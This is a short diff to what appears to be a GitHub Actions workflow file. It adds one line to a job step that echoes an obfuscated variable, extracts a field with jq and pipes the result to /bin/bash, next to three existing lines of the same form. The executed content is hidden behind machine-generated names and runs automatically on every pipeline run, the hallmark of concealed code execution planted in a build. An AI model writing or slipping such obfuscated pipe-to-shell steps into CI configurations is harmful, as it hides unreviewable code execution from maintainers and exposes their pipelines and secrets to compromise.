@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$vv66" | jq -r .iasil18652 | /bin/bash
           echo $m91 | jq -r .diob31 | /bin/bash
           echo $hirts8401 | jq -r .mrozl5 | /bin/bash
+          echo $xofq2 | jq -r .te86130 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
